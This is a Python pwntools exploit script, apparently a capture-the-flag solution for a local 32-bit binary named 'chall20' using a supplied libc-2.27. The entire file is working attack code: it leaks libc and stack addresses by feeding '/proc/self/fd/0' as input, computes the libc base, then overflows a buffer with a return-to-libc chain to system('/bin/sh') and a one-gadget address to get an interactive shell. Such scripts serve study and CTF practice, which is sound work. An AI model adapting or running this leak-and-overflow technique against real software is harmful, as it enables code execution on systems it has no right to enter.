from pwn import *


context.update(arch="i386")
context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "DEBUG"

r = process("./chall20", env={"LD_PRELOAD": "./libc.so.6"})
#gdb.attach(r)


log.info("This solution is based on the libc-2.27 we got for download")

# LEAK 
r.recvuntil('file: ')
r.sendline('/proc/self/fd/0')
r.recvuntil('file: ')

payload = 'A'*(5 + 8)  # lol
r.send('foobar\n' + payload + '\r')
r.recvuntil('A' * (5+8))
libc_ptr = u32(r.recv(4))
log.info('lib-ptr: %s' % hex(libc_ptr))

libc = ELF('./libc.so.6')
libc_offset = 0x18f75
libc.address = libc_ptr - libc_offset
log.info('libc: %s' % hex(libc.address))

r.recv(8)
stack_ptr = u32(r.recv(4))
log.info('stack-ptr: %s' % hex(stack_ptr))
ebp = stack_ptr - 0x24
rop_addr = ebp - 0x5d
log.info('rop: %s' % hex(rop_addr))


# PWN

payload = "A" * (0x10-0xb)
payload += p32(libc.symbols['system'])
payload += "AAAA"
payload += p32(next(libc.search('/bin/sh\0')))
payload += "A"* (0x50 - (0x10-0xb) - 0xc)
payload += "A"
payload += p32(0x52)
payload += "A" * 4
payload += "A" * 4
payload += "B" * 4 # ebp
magic = libc.address + 0x3d0d9
log.info('magic: %s' % hex(magic))
payload += p32(magic)


assert '\r' not in payload
assert '\n' not in payload

r.recvuntil('file: ')
r.sendline('/proc/self/fd/0')
r.recvuntil('file: ')
r.send('foobar\n' + payload + '\r')
r.interactive()
